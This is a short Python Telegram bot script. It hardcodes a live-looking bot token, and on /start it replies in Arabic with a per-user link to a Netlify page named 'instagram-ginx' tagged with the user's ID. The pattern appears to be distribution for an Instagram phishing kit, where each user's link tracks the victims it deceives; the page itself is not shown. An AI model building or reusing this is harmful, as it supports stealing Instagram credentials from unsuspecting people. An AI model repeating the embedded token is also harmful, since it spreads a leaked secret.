import os
import telebot

TOKEN = "8903980560:AAHGPoCwkt0CQcDCXs8z-ljbacSYus_vhuI"
bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    custom_link = f"https://instagram-ginx-l9n.netlify.app/index.html?id={user_id}"
    bot.reply_to(message, f"مرحباً بك!\nتفضل رابطك المخصص:\n{custom_link}")

bot.infinity_polling()
